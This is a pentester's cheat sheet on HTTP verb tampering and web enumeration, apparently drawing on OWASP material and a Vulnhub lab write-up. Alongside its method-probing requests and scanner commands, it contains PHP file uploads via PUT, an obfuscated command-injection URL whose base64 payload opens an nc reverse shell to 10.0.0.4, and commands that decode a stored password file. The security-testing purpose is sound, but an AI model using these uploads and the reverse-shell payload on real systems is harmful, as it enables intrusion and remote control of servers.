HTTP VERB TAMPERING

The HTTP specification includes request methods other than the standard GET and POST requests. A standards compliant web server may respond to these alternative methods in ways not anticipated by developers. Although the common description is 'verb' tampering, the HTTP 1.1 standard refers to these request types as different HTTP 'methods.' 

The full HTTP 1.1 specification [1] defines the following valid HTTP request methods, or verbs:

OPTIONS
GET
HEAD
POST
PUT
DELETE
TRACE
CONNECT

If enabled, the Web Distributed Authoring and Version (WebDAV) extensions [2] [3] permit several more HTTP methods:

PROPFIND
PROPPATCH
MKCOL
COPY
MOVE
LOCK
UNLOCK

As long as the web application being tested does not specifically call for any non-standard HTTP methods, testing for HTTP verb tampering is quite simple. If the server accepts a request other than GET or POST, the test fails. The solutions is to disable all non GET or POST functionality within the web application server, or in a web application firewall.

As the HTML standard does not support request methods other than GET or POST, we will need to craft custom HTTP requests to test the other methods.






 
Manual HTTP verb tampering testing
1. Crafting custom HTTP requests

[METHOD] /[index.htm] HTTP/1.1
host: [www.example.com]

1.1 OPTIONS

OPTIONS /index.html HTTP/1.1
host: www.example.com

1.2 GET

GET /index.html HTTP/1.1
host: www.example.com

1.3 HEAD

HEAD /index.html HTTP/1.1
host: www.example.com


1.4 POST

POST /index.html HTTP/1.1
host: www.example.com


1.5 PUT

PUT /index.html HTTP/1.1
host: www.example.com

1.6 DELETE

DELETE /index.html HTTP/1.1
host: www.example.com

1.7 TRACE

TRACE /index.html HTTP/1.1
host: www.example.com




1.8 CONNECT

CONNECT /index.html HTTP/1.1
host: www.example.com

2. Sending HTTP requests

nc www.example.com 80 < OPTIONS.http.txt





WEB TESTING COMMANDS 

NCAT

Nc www.web-xxx.com 80
	    > GET / HTTP/1.0
	    > Host: www.web-xxx.com

CURL
	    
curl http://www.web-xxx.com 
curl -v -X OPTIONS http://www.web-xxx.com 
curl -v -X GET http://www.web-xxx.com 
curl -v -X HEAD http://www.web-xxx.com 
curl -v -X POST http://www.web-xxx.com/secret/

curl http://192.168.1.103/dav/ --upload-file /root/Desktop/curl.php -v

Manual HTTP verb tampering testing

>> nc www.example.com 80 < OPTIONS.http.txt


[METHOD] /[index.htm] HTTP/1.1
host: [www.example.com]

OPTIONS /index.html HTTP/1.1
host: www.example.com

GET /index.html HTTP/1.1
host: www.example.com

HEAD /index.html HTTP/1.1
host: www.example.com



Automated HTTP verb tampering testing
==========
#!/bin/bash

for webservmethod in GET POST PUT TRACE CONNECT OPTIONS PROPFIND;

do
printf "$webservmethod " ;
printf "$webservmethod / HTTP/1.1\nHost: $1\n\n" | nc -q 1 $1 80 | grep "HTTP/1.1"

done
==========





NMAP
https://nmap.org/nsedoc/scripts/http-method-tamper.html

nmap -sV --script http-method-tamper <target>

nmap -sV --script http-method-tamper  <IP> -n -p 80

nmap --script=http-methods.nse  <IP> -n -p 80

nmap -p80 --script http-method-tamper --script-args 'http-method-tamper.paths={/protected/db.php,/protected/index.php}' <target>

nmap --script http-method-tamper --script-args 'http-method-tamper.paths={/method-tamper/protected/pass.txt} <IP> -n -p 80

Nmap --script=http-methods.nse --script-args http-methods.retest=1 <IP> -n -p 80

HTTP Brute Force



NIKTO

nikto -h <IP> -output page.html
nikto -h http://151.101.294.207 -output page.html

METASPLOIT

msf > use auxiliary/scanner/http/options
Msf > use auxiliary/scanner/http/verb_auth_bypass


CRUNCH

Crunch 5 5 asd > pass.txt


RESOURCES:
http://www.hackingarticles.in/multiple-ways-to-detect-http-options
https://www.youtube.com/watch?time_continue=5&v=bZlkuiUkQzE
https://www.owasp.org/index.php/Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003)
https://www.owasp.org/index.php/Web_Parameter_Tampering
https://www.youtube.com/watch?v=l5LCDEDn7FY&hd=1
https://www.youtube.com/watch?v=XV3qIgd0znc


ENUMERATION

NMAP

nmap --script http-methods --script-args http-method.test-all ='/192.168.1.109' 192.168.1.109

nmap -p- -sC -sS -T5 -A -oA full-tcp --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl 52.85.138.146

nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url='/dav/nmap.php',http-put.file='/root/Desktop/nmap.php'


DIRB

dirb http://10.0.0.10 -X .htm,.html,.php



WFUZZ

wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txthttp://10.0.0.10/test.php?file=FUZZ


EXPLOIT
http://10.0.0.10/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxMC4wLjAuNCA0NDQ0ICAK|/u?r/b?n/b?se64%20-d|/b?n/sh


COMMANDS

cat /home/bob/._pw_ | base64 -d
cat /home/bob/._pw_ | cut -d "." -f 2 | base64 -d
cat /home/bob/._pw_ | cut -d "." -f 3 | base64 -d




SOURCE

https://www.owasp.org/index.php/Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003)

https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939

http://web.archive.org/web/20170517030540/http://cdn2.hubspot.net/hub/315719/file-1344244110-pdf/download-files/Bypassing_VBAAC_with_HTTP_Verb_Tampering.pdf

https://pentestlab.blog/2012/12/20/http-methods-identification/

https://pentestlab.blog/2012/08/01/web-application-fingerprinting/

http://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/


